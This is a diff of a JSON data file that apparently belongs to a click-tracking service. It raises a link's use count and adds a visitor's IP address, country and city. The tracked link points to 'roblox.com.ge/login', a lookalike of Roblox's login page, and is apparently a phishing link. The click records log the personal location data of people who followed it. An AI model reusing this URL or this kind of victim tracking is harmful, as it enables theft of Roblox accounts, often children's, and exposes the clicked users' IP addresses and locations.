@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1478,
+    "useCount": 1479,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11992,6 +11992,14 @@
         "city": "Patpata Segundo",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777438705629,
+        "ip": "153.67.31.115",
+        "country": "Myanmar",
+        "city": "Yangon",
+        "flag": "🇲🇲",
+        "countryCode": "MM"
       }
     ]
   },
